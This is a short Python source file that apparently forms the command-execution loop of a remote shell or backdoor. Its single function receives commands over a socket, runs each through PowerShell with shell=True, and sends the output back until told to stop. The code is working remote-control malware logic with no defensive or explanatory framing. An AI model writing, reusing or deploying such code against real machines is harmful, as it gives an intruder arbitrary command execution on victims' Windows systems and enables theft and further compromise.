import subprocess  # helps running commands


def execute_command(my_socket):
    print("[+] Executing commands")

    while True:
        user_command = my_socket.receive_data()

        print(user_command)
        if user_command == "":
            continue
        if user_command == "stop":
            break

        output = subprocess.run(
            ["powershell", user_command], shell=True, capture_output=True)
        if output.stderr.decode('utf-8') == "":
            cmd_result = output.stdout.decode('utf-8')
        else:
            cmd_result = output.stderr.decode('utf-8')

        my_socket.send_command_result(cmd_result)
